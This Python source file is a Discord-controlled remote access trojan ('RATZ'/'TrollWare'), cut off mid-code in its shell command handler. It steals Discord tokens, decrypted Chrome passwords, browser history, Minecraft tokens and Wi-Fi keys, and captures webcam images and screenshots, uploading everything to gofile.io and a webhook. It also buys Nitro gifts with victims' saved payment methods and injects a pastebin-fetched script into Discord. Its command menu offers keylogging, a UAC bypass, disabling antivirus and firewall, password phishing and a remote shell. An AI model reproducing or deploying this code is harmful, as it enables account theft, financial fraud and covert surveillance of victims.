import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import cv2
import re
import requests
import platform
import json
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
import psutil
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3
import getpass
from PIL import ImageGrab
import socket
import uuid
from subprocess import Popen, PIPE
from discord import utils
token = 'TOKENHERE'

global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
global appdata
global temp
appdata = os.getenv('APPDATA')
temp= os.getenv('temp')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Availaible commands are :

--> !message = Display a message box displaying your text /Syntax = "!example message".

--> !shell = Execute shell command /Syntax = "!shell whoami"

--> !webcampic = Take a photo from the webcam

--> !windowstart = Start logging current user's window (logging is shown in crawler activity)

--> !windowstop = Stop logging the current user's window

--> !voice = Say a custom phrase aloud / Syntax = "!voice test".

--> !admincheck = Check if the program has administrator privileges

--> !sysinfo = Gives information about the infected computer

--> !history = Get Chrome Browser History

--> !download = Download a file from the infected computer

--> !upload = Upload a file to the infected computer / Syntax = "!upload file.png" (with attachment)

--> !cd = Change directory

--> !delete = Deletes a file / Syntax = "!delete /path to/the/file.txt" (with attachment)

--> !write = Type the sentence of your choice on the computer / Type "enter" to press the "enter" button on the computer

--> !wallpaper = Change the wallpaper of the infected computer / Syntax = "!wallpaper" (with attachment)

--> !clipboard = Retrieve the contents of the infected computer's clipboard.

-->! geolocate = Geolocate the computer using the latitude and longitude of the IP address with google map / Warning: The geolocation of IP addresses is not very precise.

--> !startkeylogger = Starts a keylogger (keylogger)

--> !stopkeylogger = Stop keylogger

--> !dumpkeylogger = Dump the keylogger

--> !volumemax = Set volume to maximum

--> !volumezero = Set volume to 0

--> !idletime = Get user idle time on target computer

--> !listprocess = Get all processes
--> !listprocess = Get all processes

--> !blockinput = Blocks the user's keyboard and mouse / Warning: Administrator rights are required.

--> !unblockinput = Unblocks the user's keyboard and mouse / Attention: Administrator rights are required.

--> !screenshot = Get screenshot of user's current screen

--> !exit = Quit the program

--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all".

--> !uacbypass = Attempt to bypass uac to access admin using fod help

--> !passwords = recover all passwords

--> !streamwebcam = stream the webcam by sending multiple images

--> !stopwebcam = stop webcam stream

--> !streamscreen = stream the screen by sending multiple images

--> !stopcreen = stop screen flow

--> !shutdown = shut down the computer

--> !restart = restart the computer

--> !logoff = log off current user

--> !bluescreen = Bluescreen PC

--> !displaydir = display all items in the current directory

--> !currentdir = show current directory

--> !dateandtime = show system date and time

--> !prockill = kill a process by its name / syntax = "!kill process.exe"

--> !recscreen = record screen for a while / syntax = "!recscreen 10".

--> !reccam = record camera for a while / syntax = "!reccam 10".

--> !recaudio = record audio for a certain time / syntax = "!recaudio 10".

--> !disableantivirus = permanently disable windows defender (requires admin)

--> !disablefirewall = disable windows firewall (requires administrator)

--> !audio = play an audio file on the target computer (.wav only) / Syntax = "!audio" (with attachment)
--> !selfdestruct = delete all traces that this program was on the target computer

--> !windowspass = password phishing attempt by popping up a password dialog

--> !displayoff = turn off the screen (administrator rights are required)

--> !displayon = turn on monitors (admin rights are required)

--> !hide = hide the file by changing the attribute to hidden

--> !unhide = unhide the file by removing the attribute to make it unhide

--> !ejectcd = eject the cd drive from the computer

--> !retractcd = retract the cd drive on the computer

--> !critproc = make a program a critical process, ie if the program is closed, the computer will have a blue screen (administrator rights are required).

--> !uncritproc = if the process is a critical process, it will no longer be a critical process, which means that it can be closed without a blue screen (administrator rights are required).

--> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"

--> !distaskmgr = disable task manager (admin rights are required)

--> !enbtaskmgr = enable task manager (if disabled) (admin rights are required)

--> !getwifipass = get all wifi passwords on current device (admin rights required)

--> !startup = add a file to startup (when the computer turns on, this file starts)(administrator rights required)
"""
LOGSYSTEM  =   True    # -> Send System Embed
CAMERAPIC  =   True    # -> Send Camera
PCSCRAPE   =   True    # -> Scrape Information of PC vitctim's
SENDHIST   =   True    # -> Send hist
BUY_NITRO  =   True    # -> Send Nitro gift from Account
DISCINJECT =   True    # -> Inject into Discord
PINGME     =   True    # -> Get Pinged when account is Logged
WEBHOOK    =   "WEBHOOKHERE"

class Program():
    """    The RAT  Program    """
    """ Edited By RAZ for Thio ❤️  """

    class Logger():
        """ Discord & System Logging """

        def __init__(self, webhook):
            self.hook = webhook
            self.tokens = []


        def UploadFile(self, filepath):
            server = 'https://store4.gofile.io/uploadFile'
            file = {'file': open(filepath, "rb")}
            try:
                r = requests.post(server, files=file)
                resp = r.json()
                filelink = f"[File]({resp['data']['downloadPage']})"
            except:filelink = "Error"
            return filelink


        def GetTokens(self):
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord"               : ROAMING + "\\Discord",
                "Discord Canary"        : ROAMING + "\\discordcanary",
                "Discord PTB"           : ROAMING + "\\discordptb",
                "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
                "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                'Lightcord'             : ROAMING + "\\Lightcord",
                'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
                'Amigo'                 : LOCAL + "\\Amigo\\User Data",
                'Torch'                 : LOCAL + "\\Torch\\User Data",
                'Kometa'                : LOCAL + "\\Kometa\\User Data",
                'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
                'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
                '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
                'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
                'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
                'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
                'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
                'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
                'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
                'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
                'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
            }
            
            for platform, path in PATHS.items():
                path += "\\Local Storage\\leveldb"
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for token in re.findall(regex, line):
                                        if token + " | " + platform not in self.tokens:
                                            self.tokens.append(token + " | " + platform)


        def GetBilling(self, token):
            try:
                response = requests.get(f'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers={"content-type": "application/json", "authorization": token})
                billingmail = response.json()[0]['email']
                billingname = response.json()[0]['billing_address']['name']
                address_1 = response.json()[0]['billing_address']['line_1']
                address_2 = response.json()[0]['billing_address']['line_2']
                city = response.json()[0]['billing_address']['city']
                state = response.json()[0]['billing_address']['state']
                postal = response.json()[0]['billing_address']['postal_code']
                return f"""• Name: {billingname}\n• Email: {billingmail}\n• Address: {address_1}, {address_2}\n• City/State: {city} / {state}\n• Postal Code: {postal}"""
            except:return "• Couldn't get Billing"


        def GetUserInfo(self, token):
            try:
                return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
            except:return None


        def BuyNitro(self, token):
            try:
                r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
                if r.status_code == 200:
                    payment_source_id = r.json()[0]['id']
                    if '"invalid": true' in r.text:
                        r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
                        return r.json()['gift_code']
            except:return "None"


        def CheckFriends(self, token):
            friends = ""
            try:
                req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()

                for user in req:
                    badge = ""
                    if user["user"]["public_flags"] == 1:badge = "Staff"
                    elif user["user"]["public_flags"] == 2:badge = "Partner"
                    elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
                    elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
                    elif user["user"]["public_flags"] == 512:badge = "Early"
                    elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
                    elif user["user"]["public_flags"] == 131072:badge = "Developer"
                    else:badge = ""

                    if badge != "":friends += badge + " | " + user['id'] + "\n"            
                if friends == "":friends += "❌"            
                return friends
            except:return "❌"


        def Account(self):
            """ Log/Send Discord Account Information """

            embeds = []
            for token_line in self.tokens:
                try:
                    token = token_line.split(" | ")[0]
                    tokenplatform = token_line.split(" | ")[1]
                    accountinfo = self.GetUserInfo(token)
                    rarefriends = self.CheckFriends(token)
                    username = accountinfo["username"] + "#" + accountinfo["discriminator"]
                    user_id = accountinfo["id"]
                    user_avatar = accountinfo["avatar"]
                    email = accountinfo["email"] or "❌"
                    phone = accountinfo["phone"] or "❌"
                    billingbool = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
                    mfabool = accountinfo["mfa_enabled"]

                    try:user_banner = accountinfo["banner"]
                    except:user_banner = None

                    if billingbool:billing = "✔️"
                    else:billing = "❌"
                    if billingbool:billinginfo = self.GetBilling()
                    else:billinginfo = "❌"

                    if mfabool == True:mfa = "✔️"
                    else:mfa = "❌"

                    badges = ""
                    flags = accountinfo['flags']
                    if (flags == 1):badges += "Staff, "
                    if (flags == 2):badges += "Partner, "
                    if (flags == 4):badges += "Hypesquad Event, "
                    if (flags == 8):badges += "Green Bughunter, "
                    if (flags == 64):badges += "Hypesquad Bravery, "
                    if (flags == 128):badges += "HypeSquad Brillance, "
                    if (flags == 256):badges += "HypeSquad Balance, "
                    if (flags == 512):badges += "Early Supporter, "
                    if (flags == 16384):badges += "Gold BugHunter, "
                    if (flags == 131072):badges += "Verified Bot Developer, "
                    if (badges == ""):badges = "❌"   
             
                    try:
                        if accountinfo["premium_type"] == "1" or accountinfo["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
                        elif accountinfo["premium_type"] == "2" or accountinfo["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
                        else:nitro_type = "❌ No Nitro"
                    except:nitro_type = "❌ No Nitro"

                    if BUY_NITRO:
                        nitrobuy = self.BuyNitro(token)
                        if nitrobuy == "None":nitrocode = "Nitro Code: ❌"
                        else:nitrocode = "Nitro Code: ✔️ discord.gift/" + nitrobuy
                    else:nitrocode = "Nitro Code: ❌"

                    embed = {
                        "color": 0x000000,
                        "fields": [
                            {
                                "name": "**Account Information**",
                                "value": f"```• User  ➢ {username}\n• ID    ➢ {user_id}\n• Email ➢ {email}\n• Phone ➢ {phone}```"
                            },
                            {
                                "name": "**Account Settings**",
                                "value": f"```• Nitro   ➢ {nitro_type}\n• Badges  ➢ {badges}\n• Billing ➢ {billing}\n• 2FA     ➢ {mfa}```"
                            },
                            {
                                "name": "**Billing**",
                                "value": f"```{billinginfo}```"
                            },
                            {
                                "name": "**Rare Friends:**",
                                "value": f"```{rarefriends}```"
                            },
                            {
                                "name": f"**Token ({tokenplatform})**",
                                "value": f"```{token}```"
                            }
                        ],
                        "author": {
                            "name": f"Victim ✔️ {username}",
                            "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                        },
                        "footer": {
                            "text": f"• Edited By RAZ for Thio  •  {nitrocode}",
                            "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                        },
                        "image": {
                            "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
                        },
                    }
                    embeds.append(embed)                
                except:pass
            requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": f"**New RATZ Connection** {' ||@everyone||' if PINGME else ''}","embeds": embeds,"username": "RATZ","avatar_url": "https://i.imgur.com/JzXQIkm.png"}).encode())
        
        def EncryptionKey(self):
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            mkey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            mkey = mkey[5:]
            mkey = win32crypt.CryptUnprotectData(mkey, None, None, None, 0)[1]
            return mkey

        def DecryptPass(self, password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:return ""


        def PasswordStealer(self):
            try:
                f = open('C:\ProgramData\Chrome.txt', 'a+', encoding="utf-8")
                key = self.EncryptionKey()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
                filename = "C:\ProgramData\ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0] 
                    username = row[2]
                    password = self.DecryptPass(row[3], key)     
                    if username or password:
                        f.write("─────────────────────────[TROLLWARE]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
                    else:
                        continue
                f.close()
                cursor.close()
                db.close()
                os.remove(filename)
                passlink = self.UploadFile('C:\ProgramData\Chrome.txt')
                return passlink
            except:return "Error"
        
        def MinecraftStealer(self):
            accountlocations = [
                f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\.minecraft\\launcher_accounts.json',
                f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
            ]
            mcfile = open("C:\ProgramData\Minecraft.txt", 'a+', encoding="utf-8")
            for location in accountlocations:
                if os.path.exists(location):
                    auth_db = json.loads(open(location).read())['accounts']

                    for d in auth_db:
                        sessionKey = auth_db[d].get('accessToken')
                        if sessionKey == "":
                            sessionKey = "None"
                        username = auth_db[d].get('minecraftProfile')['name']
                        sessionType = auth_db[d].get('type')
                        email = auth_db[d].get('username')
                        if sessionKey != None or '':
                            mcfile.write("─────────────────────────[TROLLWARE]─────────────────────────\n \nUsername: %s \nEmail: %s \nSession: %s \nToken: %s \n \n" % (username, email, sessionType, sessionKey))
                            mcfile.write("Username: " + username + ", Session: " + sessionType + ", Email: " + email + ", Token: " + sessionKey)
            mcfile.close()
            mclink = self.UploadFile("C:\ProgramData\Minecraft.txt")
            return mclink
            

        def TokenFile(self):
            try:
                tokenfile = open("C:\ProgramData\\tokenfile.txt", "a+", encoding="utf-8")
                for token_line in self.tokens:
                    tokenfile.write(f'{token_line}\n')
                tokenfile.close()
                return self.UploadFile("C:\ProgramData\\tokenfile.txt")
            except:return "Error"


        def Screenshot(self):
            screenshot = ImageGrab.grab()
            screenshot.save("C:\ProgramData\Screenshot.jpg")
            return self.UploadFile("C:\ProgramData\Screenshot.jpg")


        def CameraPic(self):
            if CAMERAPIC:
                try:
                    camera = cv2.VideoCapture(0)
                    camerapath = 'C:\ProgramData\Camera.jpg'
                    return_value,image = camera.read()
                    gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
                    cv2.imwrite(camerapath,image)
                    camera.release()
                    cv2.destroyAllWindows()
                    return self.UploadFile(camerapath)
                except:return "No Camera"
            else:return "False"


        def PCScrape(self):
            if PCSCRAPE:
                f = open("C:\ProgramData\PCScrape.txt", "w+", encoding="utf-8")
                scrapecmds={
                    "Current User":"whoami /all",
                    "Local Network":"ipconfig /all",
                    "FireWall Config":"netsh firewall show config",
                    "Online Users":"quser",
                    "Local Users":"net user",
                    "Admin Users": "net localgroup administrators",
                    "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                    "Port Information":"netstat -ano",
                    "Routing Information":"route print",
                    "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                    "WIFI Networks":"netsh wlan show profile",
                    "Startups":"wmic startup get command, caption",
                    "DNS Records":"ipconfig /displaydns",
                    "User Group Information":"net localgroup",
                }   
                for key,value in scrapecmds.items():
                    f.write('\n──────TROLLWARE──────[%s]──────TROLLWARE──────'%key)
                    cmd_output = os.popen(value).read()
                    f.write(cmd_output)
                f.close()
                return self.UploadFile("C:\ProgramData\PCScrape.txt")
            else:return "False"


        def BrowserHistory(self):
            if SENDHIST:
                try:
                    history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
                    login_db = os.path.join(history_path, 'History')
                    shutil.copyfile(login_db, "C:\ProgramData\histdb.db")
                    c = sqlite3.connect("C:\ProgramData\histdb.db")
                    cursor = c.cursor()
                    select_statement = "SELECT title, url FROM urls"
                    cursor.execute(select_statement)
                    history = cursor.fetchall()
                    with open('C:\ProgramData\History.txt', "w+", encoding="utf-8") as f:
                        f.write('─────────────────────[TROLLWARE]─────────────────────' + '\n' + '\n')
                        for title, url in history:
                            f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[TROLLWARE]─────────────────────"+ "\n" + "\n")
                        f.close()
                    c.close()
                    os.remove("C:\ProgramData\histdb.db")
                    histlink = self.UploadFile('C:\ProgramData\History.txt')
                    return histlink
                except:return "Error"
            else:return "False"


        def Injection(self):
            """ Log Victim out & Inject Script (Notify Password Change) & Restart """

            if DISCINJECT:
                position = "Not Injected"
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
                        proc.kill()
                for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
                    for name in dirs:
                        if "discord_desktop_core-" in name:
                            try:
                                directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                                try:os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\TrollWare"))
                                except:pass
                            except FileNotFoundError:
                                pass
                            f = requests.get("https://pastebin.com/raw/TC1vWRhG").text.replace("%WEBHOOK_LINK%", self.hook)
                            with open(directory_list, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                                position = "Injected"
                for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
                    for name in files:
                        discord_file = os.path.join(root, name)
                        os.startfile(discord_file)
                        position = "Injected & Restarted"
            else:
                position = "Not Injected"

            return position


        def GetLocalIP(self):
            hostname = socket.gethostname()    
            localip = socket.gethostbyname(hostname)    
            return localip

        def GetWiFi(self):
            try:
                wifidata = ''
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for i in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        try:wifidata += '{:} - {:}'.format(i, results[0])
                        except IndexError:wifidata += '{:} - {:}'.format(i, "No Password")
                    except subprocess.CalledProcessError:wifidata += '{:} - {:}'.format(i, "ENCODING ERROR")
                    wifidata += '\n'
                return wifidata
            except:return "Wifi Password Error"

        def System(self):
            """ Log/Send System Information & Files """
            
            embeds = []
            if LOGSYSTEM:
                try:
                    winversion = platform.platform()
                    data = requests.get("http://ipinfo.io/json").json()
                    ip = data['ip']
                    city = data['city']
                    country = data['country']
                    hostname = os.getenv("COMPUTERNAME")
                    pcusername = os.getenv("UserName")
                    ram = round(psutil.virtual_memory().total/1000000000, 2)
                    cpucores = psutil.cpu_count(logical=False)
                    macaddr = (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]))
                    try:
                        macvendor=requests.get(f'https://api.macvendors.com/{macaddr}').text
                        if "error" in macvendor:macvendor="Error"
                    except:macvendor="Error"

                    scrapelink  =  self.PCScrape()
                    cameralink  =  self.CameraPic()
                    tokenlink   =  self.TokenFile()
                    passlink    =  self.PasswordStealer()
                    histlink    =  self.BrowserHistory()
                    sslink      =  self.Screenshot()
                    mclink      =  self.MinecraftStealer()

                    injection   =  self.Injection()
                    localip     =  self.GetLocalIP()
                    wifidata    =  self.GetWiFi()

                    try:
                        p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
                        gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
                    except:gpu = "Error"

                    embed = {
                        "color": 0x000000,
                        "fields": [
                            {
                                "name": "**PC Information**",
                                "value": f"```• HostName ➢ {hostname}\n• Username ➢ {pcusername}\n• Version  ➢ {winversion}```"
                            },
                            {
                                "name": "**Hardware Information**",
                                "value": f"```• RAM ➢ {ram} GB\n• CPU ➢ {cpucores} Cores\n• GPU ➢ {gpu}```"
                            },
                            {
                                "name": "**Network Information**",
                                "value": f"```• MAC Addr ➢ {macaddr}\n• Vendor   ➢ {macvendor}\n• Local IP ➢ {localip}\n• IP Addr  ➢ {ip}\n• Region   ➢ {country}\n• City     ➢ {city}\n```"
                            },
                            {
                                "name": "** Wifi Passwords**",
                                "value": f"```{wifidata}```"
                            },
                            {
                                "name": f"**Files**",
                                "value": f"** • Camera: *{cameralink}***\n** • History: *{histlink}***\n** • PC Scrape: *{scrapelink}***\n** • Passwords: *{passlink}***\n** • Raw Tokens: *{tokenlink}***\n** • Screenshot: *{sslink}***\n** • Minecraft Accounts: *{mclink}***\n"
                            }
                        ],
                        "author": {
                            "name": f"✔️ System Information",
                        },
                        "footer": {
                            "text": f"• Edited By RAZ for Thio  •  Discord: {injection}"
                        },
                    }
                    embeds.append(embed)                
                except:pass
            requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "RATZ","avatar_url": "https://i.imgur.com/JzXQIkm.png"}).encode())

async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 1
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if total[y].startswith("session"):
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    channel_name = f"session-{number}"
    newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"||@everyone|| | Edited by RAZ for Thio | ❤️ Nouvel utilisateur | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | Utilisateur : {os.getlogin()} | IP: {ip}"
    if is_admin == True:
        await channel.send(f'{value1} | admin: ✅')
    elif is_admin == False:
        await channel.send(f'{value1} | admin: ❌')
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)
    
def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)
        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} n'est pas une session valide, vérifier l'orthographe")

        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = temp + r"\key_log.txt"
            file = discord.File(file_keys, filename="key_log.txt")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
            os.remove(file_keys)

        if message.content == "!exit":
            import sys
            uncritproc()
            sys.exit()

        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
            os.remove(path)

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send("[❤️] - Volume réglé sur 100%")

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send("[❤️] - Volume réglé sur 0%")

        if message.content == "!webcampic":
            import os
            import time
            import cv2
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            #time.sleep(0.1)
            return_value, image = camera.read()
            cv2.imwrite(temp + r"\temp.png", image)
            del(camera)
            file = discord.File(temp + r"\temp.png", filename="temp.png")
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès", file=file)
        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)

        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[❤️] - La commande à été éxecutée avec succès")

        if message.content.startswith("!shell"):
            global status
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            out = shell(instruction)
            print(out)
            print(status)
            if status:
                numb = len(out)
                if numb < 1:
